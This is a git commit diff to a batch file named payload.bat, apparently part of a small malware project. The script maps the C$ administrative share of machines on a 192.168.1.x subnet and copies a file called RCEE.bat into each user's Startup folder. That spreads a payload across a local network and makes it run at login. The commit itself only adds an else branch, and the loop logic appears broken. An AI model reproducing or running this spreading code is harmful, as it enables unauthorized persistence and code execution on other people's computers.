69327e0997fbf9a83632fcb78e113085065f86f4
H1i_sillyxploiter <129692077+unfunnylaugh@users.noreply.github.com>
2024-02-27 13:16:33 -0300

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -6,7 +6,7 @@ echo Starting System...
 SET i=0
 
 net use Z: \\192.168.1.%i%\C$
-if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy shell:startup\RCEE.bat "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RCEE.bat"
+if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy shell:startup\RCEE.bat "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RCEE.bat" else (exit)
 :: mountvol Z: /d)
 if %i% == 256 (exit) else (set /a i=i+1)
 
